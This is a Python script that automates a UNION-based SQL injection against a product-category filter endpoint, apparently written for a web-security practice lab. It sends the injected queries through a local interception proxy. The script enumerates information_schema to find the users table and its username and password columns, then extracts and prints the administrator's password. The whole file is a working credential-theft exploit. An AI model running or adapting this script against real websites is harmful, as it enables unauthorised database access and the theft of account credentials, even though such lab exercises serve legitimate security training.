import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def perform_requests(url, sql_payload):
    path = '/filter?category=Pets'
    r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
    return r.text

def exploit_sqli_users_table(url):
    sql_payload = "' UNION SELECT table_name, NULL FROM information_schema.tables--"
    res = perform_requests(url, sql_payload)
    soup = BeautifulSoup(res, 'html.parser')
    users_table = soup.find(text=re.compile('.*users.*'))
    if users_table:
        return users_table
    else:
        return False

def exploit_sqli_users_columns(url, users_table):
    sql_payload = "' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = '%s'--" % users_table
    res = perform_requests(url, sql_payload)
    soup = BeautifulSoup(res, 'html.parser')
    username_column = soup.find(text=re.compile('.*username.*'))
    password_column = soup.find(text=re.compile('.*password.*'))
    return username_column, password_column

def exploit_sqli_admin_creds(url, users_table, username_column, password_column):
    sql_payload = "' UNION select %s, %s from %s--" % (username_column, password_column, users_table)
    res = perform_requests(url, sql_payload)
    soup = BeautifulSoup(res, 'html.parser')
    admin_pass = soup.body.find(text='administrator').parent.findNext('td').contents[0]
    return admin_pass

if __name__ == "__main__":
    try:
        url = sys.argv[1]

    except IndexError:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    print("[+] Looking for the users table...")
    users_table = exploit_sqli_users_table(url)
    if users_table:
        print("Found the users table: %s \n" % users_table)
        # After finding the table, we can now output relevant columns from the table
        username_column, password_column = exploit_sqli_users_columns(url, users_table)
        print("[+] Looking for username and password columns on %s table" % users_table)
        if username_column and password_column:
            print("Found the username column name: %s" % username_column)
            print("Found the password column name: %s \n" % password_column)
            # Once we find the username and password columns, we can now output the actual username/password for admin user
            admin_pass = exploit_sqli_admin_creds(url, users_table, username_column, password_column)
            print("[+] Determining administrator password from %s column" % password_column)
            if admin_pass:
                print("The administrator password is: %s" %admin_pass)
            else:
                print("[-] Could not find administrator password!")

        else:
            print("[-] Did not find the username and password columns!")
    else:
        print("[-] Did not find any users table!")
